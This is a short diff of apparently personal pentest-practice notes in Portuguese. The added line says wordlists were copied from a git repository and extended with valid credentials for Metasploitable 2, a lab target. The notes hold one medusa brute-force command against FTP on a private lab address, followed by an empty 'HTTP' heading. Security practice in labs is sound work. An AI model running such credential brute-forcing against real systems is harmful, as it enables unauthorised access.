@@ -1,3 +1,5 @@
+As word lists foram copiadas de um git e incremetadas com as válidas para o metasploited 2
+
 FTP
 medusa -h 192.168.56.104 -U users.txt -P pass.txt -M ftp
 HTTP
